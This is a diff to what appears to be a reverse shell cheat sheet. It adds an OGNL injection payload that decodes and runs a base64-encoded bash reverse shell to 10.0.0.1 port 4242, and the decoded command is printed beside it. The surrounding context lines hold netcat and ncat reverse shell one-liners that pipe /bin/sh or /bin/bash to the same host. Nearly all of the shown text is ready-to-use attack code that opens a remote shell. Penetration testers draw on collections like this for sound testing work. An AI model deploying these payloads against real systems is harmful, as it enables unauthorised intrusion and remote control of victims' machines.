@@ -22,6 +22,7 @@
     * [Netcat BusyBox](#netcat-busybox)
     * [Netcat Traditional](#netcat-traditional)
     * [NodeJS](#nodejs)
+    * [OGNL](#ognl)
     * [OpenSSL](#openssl)
     * [Perl](#perl)
     * [PHP](#php)
@@ -251,6 +252,14 @@ rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ncat 10.0.0.1 4242 -e /bin/bash
 ncat --udp 10.0.0.1 4242 -e /bin/bash
 ```
+
+### OGNL
+
+```java
+(#a='echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg== | base64 -d | bash -i').(#b={'bash','-c',#a}).(#p=new java.lang.ProcessBuilder(#b)).(#process=#p.start())
+```
+
+With `YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg==` decoding to `bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'`, the payload within the single quotes might be changed by any Linux-compatible reverse shell.
 
 ### OpenSSL
 
